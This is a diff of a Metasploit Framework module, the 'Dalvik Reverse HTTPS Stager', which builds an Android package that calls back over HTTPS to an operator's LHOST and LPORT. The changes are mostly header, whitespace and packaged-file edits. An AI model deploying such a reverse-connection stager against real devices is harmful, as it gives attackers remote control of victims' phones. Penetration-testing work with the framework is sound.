@@ -1,10 +1,7 @@
 ##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
+# This module requires Metasploit: http//metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
-#
 
 require 'msf/core'
 require 'msf/core/handler/reverse_https'
@@ -18,21 +15,20 @@ module Metasploit3
     super(merge_info(info,
       'Name'          => 'Dalvik Reverse HTTPS Stager',
       'Description'   => 'Tunnel communication over HTTPS',
-      'Author'        => 'anwarelmakrahy', 
+      'Author'        => 'anwarelmakrahy',
       'License'       => MSF_LICENSE,
       'Platform'      => 'android',
       'Arch'          => ARCH_DALVIK,
       'Handler'       => Msf::Handler::ReverseHttps,
       'Stager'        => {'Payload' => ""}
-      ))
+    ))
 
     register_options(
     [
       OptInt.new('RetryCount', [true, "Number of trials to be made if connection failed", 10])
     ], self.class)
-
   end
-  
+
   def generate_jar(opts={})
     host = datastore['LHOST'] ? datastore['LHOST'].to_s : String.new
     port = datastore['LPORT'] ? datastore['LPORT'].to_s : 8443.to_s
@@ -47,8 +43,6 @@ module Metasploit3
 
     files = [
       [ "AndroidManifest.xml" ],
-      [ "res", "drawable-mdpi", "icon.png" ],
-      [ "res", "layout", "main.xml" ],
       [ "resources.arsc" ]
     ]
 
@@ -60,5 +54,4 @@ module Metasploit3
 
     jar
   end
- 
 end
